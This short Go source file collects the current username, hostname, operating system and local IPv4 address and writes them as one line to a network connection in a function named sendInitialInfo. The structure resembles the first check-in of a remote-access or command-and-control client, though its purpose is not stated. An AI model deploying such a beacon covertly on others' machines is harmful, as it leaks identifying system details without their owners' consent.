package main

import (
	"fmt"
	"net"
	"os"
	"os/user"
	"runtime"
)

func gatherInfo() string {
	userObj, _ := user.Current()
	host, _ := os.Hostname()
	osName := runtime.GOOS
	ram := getRAM()
	ip := getLocalIP()
	return fmt.Sprintf("%s|%s|%s|%s|%s\n", userObj.Username, host, osName, ram, ip)
}

func getRAM() string {
	return "-"
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}
	for _, addr := range addrs {
		ipnet, ok := addr.(*net.IPNet)
		if ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
			return ipnet.IP.String()
		}
	}
	return "unknown"
}

func sendInitialInfo(conn net.Conn) error {
	info := gatherInfo()
	_, err := conn.Write([]byte(info))
	return err
}
